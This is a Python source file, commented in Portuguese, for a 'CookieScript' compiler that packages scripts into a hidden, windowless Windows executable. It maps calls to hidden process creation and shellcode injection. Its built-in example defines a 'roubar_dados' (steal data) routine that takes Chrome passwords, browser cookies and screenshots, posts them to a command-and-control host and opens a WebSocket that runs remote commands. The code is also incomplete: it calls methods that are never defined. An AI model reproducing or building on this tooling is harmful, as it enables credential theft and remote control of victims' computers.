# cookiescript/compiler.py
import re
import ast
import subprocess
from typing import Dict, Any

class CookieScriptCompiler:
    """
    Compila CookieScript para executável nativo com capacidades web
    """
    
    def __init__(self):
        self.codigo_final = []
        self.funcoes_system = {}
        self.funcoes_web = {}
    
    def compilar(self, codigo_fonte: str) -> str:
        """Compila para executável"""
        
        # 1. Parse do código
        arvore = self._parse(codigo_fonte)
        
        # 2. Gera código Python intermediário
        codigo_py = self._gerar_python(arvore)
        
        # 3. Gera código JS para web parts
        codigo_js = self._gerar_javascript(arvore)
        
        # 4. Embrulha tudo em executável
        return self._empacotar(codigo_py, codigo_js)
    
    def _parse(self, codigo):
        """Parser simples para CookieScript"""
        # @system function nome(args) { ... }
        padrao_system = r'@system\s+function\s+(\w+)\s*\((.*?)\)\s*\{(.*?)\}'
        
        # @web function nome(args) { ... }
        padrao_web = r'@web\s+function\s+(\w+)\s*\((.*?)\)\s*\{(.*?)\}'
        
        funcoes = []
        
        # Extrai funções system
        for match in re.finditer(padrao_system, codigo, re.DOTALL):
            nome, args, corpo = match.groups()
            funcoes.append({
                'tipo': 'system',
                'nome': nome,
                'args': args,
                'corpo': corpo
            })
        
        # Extrai funções web
        for match in re.finditer(padrao_web, codigo, re.DOTALL):
            nome, args, corpo = match.groups()
            funcoes.append({
                'tipo': 'web',
                'nome': nome,
                'args': args,
                'corpo': corpo
            })
        
        return funcoes
    
    def _gerar_python(self, funcoes):
        """Gera código Python com chamadas ao sistema"""
        codigo = """
import ctypes
import ctypes.wintypes
import asyncio
import sys

class CookieScriptRuntime:
    def __init__(self):
        self.web_bridge = None
        
    def init_web(self, js_code):
        from py_mini_racer import MiniRacer
        self.web_bridge = MiniRacer()
        self.web_bridge.eval(js_code)
    
"""
        
        for func in funcoes:
            if func['tipo'] == 'system':
                codigo += f"""
    def {func['nome']}(self, {func['args']}):
        {self._converter_codigo_system(func['corpo'])}
"""
        
        return codigo
    
    def _converter_codigo_system(self, corpo_cookiescript):
        """Converte código CookieScript para chamadas de sistema Python"""
        
        # Mapeamento de funções CookieScript -> System API
        mapeamento = {
            'escrever_registro': 'self._system.escrever_registro',
            'criar_processo': 'self._system.criar_processo_oculto',
            'alocar_memoria': 'self._system.alocar_memoria',
            'injetar_shellcode': 'self._system.injetar_shellcode',
            'enviar_para_web': 'self.web_bridge.call'  # Ponte para JS
        }
        
        for cmd_py, cmd_sistema in mapeamento.items():
            corpo_cookiescript = corpo_cookiescript.replace(cmd_py, cmd_sistema)
        
        return corpo_cookiescript
    
    def _empacotar(self, codigo_py, codigo_js):
        """Empacota em executável standalone usando PyInstaller"""
        
        # Salva arquivos temporários
        with open('cookiescript_temp.py', 'w') as f:
            f.write(codigo_py)
        
        with open('cookiescript_web.js', 'w') as f:
            f.write(codigo_js)
        
        # Compila para .exe
        subprocess.run([
            'pyinstaller', 
            '--onefile', 
            '--noconsole',  # Sem janela (oculto)
            '--name', 'CookieScript',
            'cookiescript_temp.py'
        ])
        
        return 'dist/CookieScript.exe'

# Exemplo de uso
compiler = CookieScriptCompiler()

codigo_exemplo = """
@system
function roubar_dados() {
    // Acesso direto ao sistema
    senhas = extrair_senhas_chrome();
    cookies = extrair_cookies_navegador();
    screenshot = tirar_print();
    
    // Envia via web (chama função @web)
    enviar_para_c2(senhas, cookies, screenshot);
}

@web
function enviar_para_c2(dados) {
    // Conexão com servidor remoto
    fetch('https://servidor-c2.com/exfiltrar', {
        method: 'POST',
        body: JSON.stringify(dados)
    });
    
    // Mantém conexão WebSocket para comandos
    ws = new WebSocket('wss://servidor-c2.com/comandos');
    ws.onmessage = (cmd) => {
        executar_comando_sistema(cmd.data);  // Chama @system de volta
    };
}
"""

compiler.compilar(codigo_exemplo)